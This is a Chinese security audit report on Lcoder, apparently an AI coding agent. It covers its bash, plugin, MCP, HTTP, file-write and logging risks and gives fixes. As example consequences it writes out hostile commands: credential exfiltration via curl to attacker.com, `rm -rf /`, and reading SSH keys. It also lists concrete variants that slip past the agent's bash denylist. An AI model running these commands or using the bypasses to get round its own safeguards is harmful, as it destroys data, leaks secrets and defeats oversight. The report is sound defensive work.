# Lcoder 安全漏洞巡查报告

> 生成日期：2026-07-01
> 范围：Lcoder 命令执行、文件访问、网络请求、扩展/插件、审计日志、默认权限
> 方法：源代码审查、配置分析、默认行为测试

---

## 一、报告摘要

本次巡查针对 Lcoder 的核心工具链、扩展机制、网络访问、文件操作和日志记录进行了安全审查。发现的主要风险集中在：**默认配置过度放权**、**扩展/插件/MCP 可执行任意代码**、**审计与会话日志权限过宽**、**安全控制策略易被绕过**。

| 严重级别 | 数量 | 说明 |
|---------|------|------|
| 🔴 严重 | 5 | 可导致任意命令执行、任意文件覆盖、数据外泄、RCE |
| 🟠 高危 | 5 | 可导致敏感信息泄露、权限绕过、配置滥用 |
| 🟡 中危 | 5 | 可导致 OOM、信息泄露、配置风险 |
| 🟢 低危/注意事项 | 3 | 设计风险、校验不足、测试风险 |

---

## 二、严重漏洞（Critical）

### 2.1 默认配置下 Bash 工具可执行任意命令

**影响组件**
- `pkg/tools/builtin/bash.go`
- `pkg/config/config.go`（默认权限规则）

**漏洞描述**
- `bash` 工具直接将 LLM 生成的字符串传入 `sh -c <command>` 执行。
- 默认沙箱 backend 为 `passthrough`（零隔离），进程内与进程外均无限制。
- 默认权限中 `bash` 仅配置为 `ask`（询问），但 `git *` 和 `go test *` 被自动允许，其余命令只需用户一次确认即可执行。
- 一旦用户开启自动批准或误点确认，模型可执行任意命令。

**可能后果**
- 删除任意文件：`rm -rf /`
- 读取敏感文件：`cat ~/.ssh/id_rsa`
- 数据外泄：`curl -d "$(cat ~/.aws/credentials)" http://attacker.com`
- 持久化后门：写入 `~/.bashrc`、`~/.ssh/authorized_keys`、cron 任务

**修复建议**
1. 默认启用 `soft-limit` 沙箱，并将 `filesystem.writable` 限制在项目目录。
2. 对 `bash` 默认采用白名单机制，只放行 `git`、`go test` 等明确安全的命令。
3. 对 `rm`、`curl`、`wget`、`nc`、`python` 等高危命令实施命令签名/词法分析。
4. 在 CLI 模式下对 `bash` 默认 `deny`，仅在用户显式配置或项目受信时允许。

---

### 2.2 扩展/插件机制可执行任意代码

**影响组件**
- `pkg/extension/loader.go`
- `pkg/extension/plugin.go`

**漏洞描述**
- `extension.Install` 支持从任意 Git URL 安装扩展，无需签名或来源校验。
- `PluginLoader.Build` 可编译任意 Go 目录为 `.so` 插件。
- `plugin.Open` + `Lookup("New")` 会执行插件 `init()` 中的任意代码。
- 如果用户安装恶意扩展，或 `.lcoder/config.yaml` 被篡改，等于直接获得 RCE。

**可能后果**
- 安装恶意扩展后，插件在加载时即可执行任意系统命令。
- 扩展可访问完整文件系统、网络、环境变量，并订阅所有事件总线信息。

**修复建议**
1. 默认禁用 `PluginLoader`（Go plugin 本身也限制 Linux/macOS）。
2. 扩展安装前强制用户确认，并显示完整来源 URL。
3. 对扩展来源建立 allowlist 或签名校验机制。
4. 扩展运行时使用沙箱限制文件系统和网络访问。

---

### 2.3 MCP 服务器配置可执行任意命令

**影响组件**
- `pkg/mcp/client.go`

**漏洞描述**
- `mcp_servers` 配置中的 `command` 字段直接传给 `exec.Command(command[0], command[1:]...)`。
- 配置示例中就有 `npx -y @modelcontextprotocol/server-filesystem .`。
- 恶意配置可设置任意命令，如 `["bash", "-c", "rm -rf /"]` 或 `["curl", "attacker.com"]`。

**可能后果**
- 启动 MCP 服务器时直接执行恶意命令。
- 通过 MCP 工具间接执行系统命令或访问内部网络。

**修复建议**
1. 对 MCP 命令建立 allowlist，默认只允许已知安全的命令（如 `npx`）。
2. 不信任项目配置中的 MCP 服务器（项目信任机制已存在，需严格执行）。
3. 对 MCP 进程使用沙箱隔离，限制其文件系统和网络访问。
4. 对 MCP 命令参数进行校验，禁止 shell 元字符和路径穿越。

---

### 2.4 HTTP 工具默认无 SSRF 防护

**影响组件**
- `pkg/tools/http.go`

**漏洞描述**
- HTTP 工具向配置端点发送请求，默认 `passthrough` 网络允许所有目标。
- 即使配置了 `sandbox.network`，HTTP 工具通过 `DialContext` 走网络策略，但默认策略仍是 `default: allow`。
- 请求体中包含当前 `cwd`（当前工作目录），可能泄露路径信息。
- 对响应体大小无限制，恶意端点可返回超大内容导致 OOM。
- 响应中的 `"image"` 类型被直接解析为 `ImageContent{Data: ...}`，无大小/MIME 校验。

**可能后果**
- SSRF 攻击内部服务（如 `http://localhost:8080`、`http://169.254.169.254` 云元数据）。
- 数据外泄到攻击者控制端点。
- 通过大响应造成拒绝服务。

**修复建议**
1. 默认启用网络 `default: deny`，并只允许用户显式配置的端点。
2. 对 HTTP 响应使用 `io.LimitReader` 限制最大大小。
3. 对 image 数据限制大小和允许的 MIME 类型。
4. 从请求体中移除或限制 `cwd` 等可能泄露的信息。
5. 禁止访问常见内网地址和云元数据地址。

---

### 2.5 文件写/编辑工具默认可覆盖任意路径

**影响组件**
- `pkg/tools/builtin/write.go`
- `pkg/tools/builtin/edit.go`
- `pkg/tools/builtin/fspath.go`

**漏洞描述**
- 默认沙箱 backend 为 `passthrough`，`Filesystem().Check` 恒放行。
- 默认权限中 `write` 和 `edit` 配置为 `"*": "allow"`。
- `resolveAndCheck` 在没有 sandbox 时仅做 `filepath.Clean`，不限制项目边界。
- 模型可调用 `write` 覆盖系统文件或用户敏感文件。

**可能后果**
- 覆盖 `~/.bashrc`、`~/.ssh/authorized_keys` 实现持久化。
- 覆盖 `~/.lcoder/config.yaml` 或 `~/.lcoder/credentials.yaml` 劫持配置。
- 覆盖项目外的重要文件。

**修复建议**
1. 默认启用 `soft-limit` 沙箱，并将 `filesystem.writable` 限制在项目根目录。
2. 即使无沙箱，工具层也应强制路径边界检查（限制在项目根目录内）。
3. 对 `write`/`edit` 的默认权限改为 `deny` 或 `ask`，仅在用户显式授权时允许。

---

## 三、高危漏洞（High）

### 3.1 审计日志以 0644 保存，且包含敏感参数

**影响组件**
- `pkg/observability/audit.go`
- `pkg/observability/observability.go`

**漏洞描述**
- `FileAuditLogger` 创建文件时使用 `0o644`。
- `AuditRecord.Args` 记录完整工具参数，包括：
  - `bash` 命令内容
  - `write` 的文件内容
  - `edit` 的替换文本
  - HTTP 工具参数
- 任何能读取 `~/.lcoder/audit/` 的用户/进程都能拿到这些敏感信息。

**可能后果**
- 同系统其他用户读取审计日志，获取 API 密钥、SSH 私钥、文件内容。
- 日志泄露导致横向移动或持久化凭证。

**修复建议**
1. 审计日志文件权限改为 `0o600`。
2. 对 `Args` 中的敏感字段进行脱敏或哈希（如对 `bash` 命令、文件内容做截断）。
3. 提供配置项让用户选择是否记录完整参数。

---

### 3.2 主配置文件可能以 0644 保存 API Key

**影响组件**
- `pkg/config/config.go`
- `pkg/config/credentials.go`

**漏洞描述**
- `~/.lcoder/credentials.yaml` 使用 `0o600`（正确）。
- 但 `~/.lcoder/config.yaml` 使用 `0o644`，且 `config.providers.<name>.api_key` 字段可手写 API key。
- 如果用户直接在 `config.yaml` 中写 key，该文件是 644 权限，可被同系统其他用户读取。

**可能后果**
- API key 泄露，导致 LLM 服务滥用或账单失控。

**修复建议**
1. 在加载 config 时检测 `api_key` 字段，提示用户迁移到 `credentials.yaml`。
2. 文档明确禁止在 `config.yaml` 中写入 API key。
3. 考虑在保存 `config.yaml` 时扫描并移除 API key。

---

### 3.3 Bash 黑名单用 `strings.Contains` 匹配，极易绕过

**影响组件**
- `pkg/agent/hooks/bash_denylist.go`

**漏洞描述**
- 黑名单模式使用 `strings.Contains(cmd, pattern)` 进行子串匹配，且先将命令转小写。
- 示例配置中的模式如 `rm -rf /` 可轻易绕过：
  - `rm -rf ///`
  - `rm -rf / `
  - `cd / && rm -rf .`
  - `rm -rf $(printf /)`
  - `rm -rf /tmp/../`
- 这种字符串黑名单是不可靠的安全控制。

**可能后果**
- 绕过黑名单执行危险命令，如删除文件、格式化磁盘等。

**修复建议**
1. 放弃黑名单，改用命令白名单机制。
2. 或引入 shell 词法分析（如使用 `shlex` 或手写解析器）识别命令结构。
3. 对危险命令进行语义级拦截。

---

### 3.4 敏感文件检查模式匹配逻辑薄弱

**影响组件**
- `pkg/agent/hooks/sensitive_file.go`

**漏洞描述**
- 对非 glob 模式使用 `strings.Contains(path, pattern)`：
  - 模式 `.env` 会误匹配 `safe.env.txt`
  - 模式 `.key` 会误匹配 `my.keychain`
- 对 glob 模式只匹配 `filepath.Base(path)`，不检查完整路径：
  - 模式 `*.env` 只能匹配 basename，无法匹配 `config/.env` 或 `sub/.env`

**可能后果**
- 误拦截合法文件，或漏检真正的敏感文件。
- 敏感文件保护机制不可靠。

**修复建议**
1. 对 glob 和非 glob 模式都针对完整路径进行匹配。
2. 使用更精确的匹配规则，如 `**/.env` 支持任意目录层级。
3. 对非 glob 模式要求精确匹配或边界限定。

---

### 3.5 路径穿越：无沙箱时 `filepath.Clean` 不阻止越界

**影响组件**
- `pkg/tools/builtin/fspath.go`

**漏洞描述**
- `resolveAndCheck` 用 `filepath.Clean` 规范化路径后，如果没有 sandbox，直接返回路径。
- 在 `passthrough` 模式下，模型可以写入 `../../../etc/cron.d/backdoor` 并覆盖系统文件。
- 安全完全依赖于可选的 sandbox 配置。

**可能后果**
- 覆盖项目外任意文件。
- 写入系统目录实现持久化。

**修复建议**
1. 即使无沙箱，工具层也应强制路径边界检查（限制在项目根目录内）。
2. 把路径边界检查作为工具层的基础安全能力，而非仅由沙箱提供。
3. 对 `..` 和绝对路径做显式限制，除非用户在白名单中指定。

---

## 四、中危漏洞（Medium）

### 4.1 HTTP 工具响应体无大小限制

**影响组件**
- `pkg/tools/http.go`

**漏洞描述**
- `io.ReadAll(resp.Body)` 会把整个响应读入内存。
- 恶意或异常端点返回 GB 级数据会导致 OOM。

**可能后果**
- 拒绝服务（DoS）。

**修复建议**
1. 使用 `io.LimitReader` 限制最大响应大小。
2. 在配置中提供 `max_response_bytes` 选项。

---

### 4.2 HTTP 工具头中环境变量扩展可能泄露敏感信息

**影响组件**
- `pkg/tools/http.go`

**漏洞描述**
- 配置 header 时使用 `os.ExpandEnv(v)` 扩展环境变量。
- 如果 header 值包含 `${HOME}`、`${SSH_PRIVATE_KEY}`、`*_TOKEN`、`*_SECRET` 等，可能把敏感信息发送给外部端点。

**可能后果**
- 敏感环境变量通过 HTTP 头外泄。

**修复建议**
1. 提供 header 环境变量 allowlist，只允许安全变量扩展。
2. 或默认关闭环境变量扩展，需要显式开启。

---

### 4.3 会话/Observability 文件权限为 0644

**影响组件**
- `pkg/session/store.go`
- `pkg/observability/exporter.go`

**漏洞描述**
- 会话 JSONL 包含完整对话内容。
- Observability 文件包含工具调用、参数、耗时等。
- 这些文件使用 `0o644` 创建，同系统其他用户可读。

**可能后果**
- 同系统其他用户读取会话内容和工具调用细节。
- 泄露项目信息、代码片段、API 调用内容。

**修复建议**
1. 会话文件和 observability 文件权限改为 `0o600`。
2. 对目录本身也设置 `0o700`。

---

### 4.4 配置验证不足

**影响组件**
- `pkg/config/config.go`

**漏洞描述**
- 缺少统一的 `Config.Validate()`。
- 例如：
  - `sandbox.backend` 设成 `container` 运行时才报错。
  - `permissions` 中的决策字符串不合法时未校验。
  - `http_tools` 端点可设成本地服务地址导致 SSRF。

**可能后果**
- 启动时报错晚，错误信息不清晰。
- 配置滥用导致安全漏洞。

**修复建议**
1. 添加启动时统一配置验证 `Config.Validate()`。
2. 对 `http_tools` 端点默认拒绝内网/元数据地址。
3. 对 `permissions` 规则中的决策字符串做合法性校验。

---

### 4.5 模型目录缓存文件权限为 0644

**影响组件**
- `pkg/llm/catalog/catalog.go`

**漏洞描述**
- 模型目录缓存 `~/.lcoder/cache/models.json` 使用 `0o644`。
- 虽然默认不包含 API key，但用户自定义 catalog 可能包含敏感元数据。

**可能后果**
- 模型目录信息泄露。
- 若未来包含 pricing 等敏感信息，会被同系统用户读取。

**修复建议**
1. 模型目录缓存文件权限改为 `0o600`。
2. 缓存目录权限改为 `0o700`。

---

## 五、低危/注意事项（Low）

### 5.1 工具参数校验只检查顶层类型

**影响组件**
- `pkg/tools/validate.go`

**问题描述**
- 已实现 `ValidateArgs`，但只检查 required 字段和顶层类型。
- 不校验 enum 值、字符串 pattern、数字范围、嵌套对象、数组元素类型。

**修复建议**
1. 引入完整 JSON Schema 校验库，如 `github.com/xeipuuv/gojsonschema` 或 `github.com/santhosh-tekuri/jsonschema`。
2. 覆盖所有 JSON Schema 常见约束。

---

### 5.2 事件总线可被恶意扩展订阅

**影响组件**
- `pkg/events/bus.go`

**问题描述**
- 扩展可以订阅所有事件，包括消息内容、工具参数。
- 这是设计上的能力，但如果扩展不可信，会造成信息泄露。

**修复建议**
1. 文档明确说明扩展拥有完整系统访问权限。
2. 建议只安装可信扩展，并考虑对扩展来源进行签名校验。

---

### 5.3 集成测试可能使用真实 API Key

**影响组件**
- `test/integration/agent_realrun_test.go`

**问题描述**
- 测试会读取真实配置和 credentials。
- 虽然测试会跳过无 key 的情况，但 CI 环境若有 key 会发起真实 LLM 调用。

**修复建议**
1. 确保 CI 不配置真实 API key。
2. 对真实 LLM 调用测试使用明确的 build tag 或环境变量开关，默认不运行。

---

## 六、修复优先级建议

| 优先级 | 问题 | 修复动作 | 影响面 |
|--------|------|---------|--------|
| P0 | 默认配置过度放权 | 默认启用沙箱、限制 bash 白名单、限制 write/edit 在项目目录 | 核心安全 |
| P0 | 扩展/插件/MCP 任意代码执行 | 默认禁用 plugin、扩展安装确认、MCP 命令白名单 | 核心安全 |
| P0 | 审计/会话/Observability 文件权限 | 全部改为 `0o600` | 信息泄露 |
| P1 | Bash 黑名单不可靠 | 改为命令白名单或词法分析 | 命令执行 |
| P1 | 敏感文件检查弱 | 使用完整路径匹配 | 信息泄露 |
| P1 | HTTP 工具 SSRF/无响应限制 | 默认拒绝内网、限制响应大小 | 网络安全 |
| P2 | 配置验证不足 | 添加 `Config.Validate()` | 配置安全 |
| P2 | 工具参数校验不完整 | 引入 JSON Schema 校验 | 输入安全 |
| P3 | 集成测试使用真实 key | CI 隔离、默认不运行 | 测试安全 |

---

## 七、总体评估

Lcoder 当前的安全模型高度依赖**用户是否启用沙箱**和**用户是否仔细审查每次工具调用**。在默认配置下，系统对文件、网络、命令执行的限制都非常宽松，容易被 LLM 生成的恶意或错误工具调用滥用。

**最关键的三个问题**：
1. **默认配置不安全**：write/edit/bash 权限过大，沙箱默认关闭。
2. **安全控制不可靠**：黑名单和字符串匹配容易被绕过。
3. **日志记录敏感信息**：审计日志和会话文件权限不足，且记录完整参数。

建议优先将默认配置收紧为“最小权限 + 沙箱隔离”，并引入白名单、路径边界检查和敏感日志脱敏。

---

*本报告基于 2026-07-01 的代码快照生成，后续代码演进可能改变部分风险状态。*
